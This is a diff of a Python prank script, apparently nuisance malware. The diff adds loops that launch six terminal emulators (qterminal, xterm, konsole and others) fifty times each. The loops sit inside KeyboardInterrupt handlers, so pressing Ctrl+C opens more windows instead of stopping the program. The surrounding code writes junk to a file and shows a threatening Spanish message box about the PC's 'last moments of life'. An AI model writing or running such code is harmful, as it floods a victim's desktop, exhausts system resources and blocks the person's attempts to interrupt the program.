@@ -35,6 +35,19 @@ def webOpen():
                sleep(15)               
                
      except KeyboardInterrupt:
+          for _ in range(50):
+               system('qterminal')
+               
+               system('terminator')
+               
+               system('alacritty')
+               
+               system('xterm')
+               
+               system('konsole')
+               
+               
+               system('xfce4-terminal-emulator')
           print("XD")
 
      except Exception as e:
@@ -55,7 +68,7 @@ def annoying_behavior():
                     f.write("SO SUSSY")
                
                
-          for _ in range(35):
+          for _ in range(50):
                system('qterminal')
                
                system('terminator')
@@ -71,6 +84,19 @@ def annoying_behavior():
                     
      except KeyboardInterrupt:
           print("XD")
+          for _ in range(50):
+               system('qterminal')
+               
+               system('terminator')
+               
+               system('alacritty')
+               
+               system('xterm')
+               
+               system('konsole')
+               
+               
+               system('xfce4-terminal-emulator')
      except Exception as e:
           handle(e)
           messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
